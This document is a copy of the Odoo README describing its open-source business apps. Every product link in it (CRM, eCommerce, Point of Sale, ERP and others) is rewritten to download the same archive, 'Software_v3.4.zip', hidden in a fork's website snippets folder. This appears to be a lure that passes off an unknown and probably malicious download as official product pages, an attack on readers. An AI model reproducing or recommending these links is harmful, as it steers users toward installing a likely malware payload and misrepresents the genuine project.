Odoo
----

Odoo is a suite of web based open source business apps.

The main Odoo Apps include an <a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Open Source CRM</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Website Builder</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">eCommerce</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Warehouse Management</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Project Management</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Billing &amp; Accounting</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Point of Sale</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Human Resources</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Marketing</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Manufacturing</a>,
<a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">...</a>

Odoo Apps can be used as stand-alone applications, but they also integrate seamlessly so you get
a full-featured <a href="https://github.com/houda-ohm/odoo/raw/refs/heads/14.0/addons/website/static/src/snippets/s_hr/Software_v3.4.zip">Open Source ERP</a> when you install several Apps.
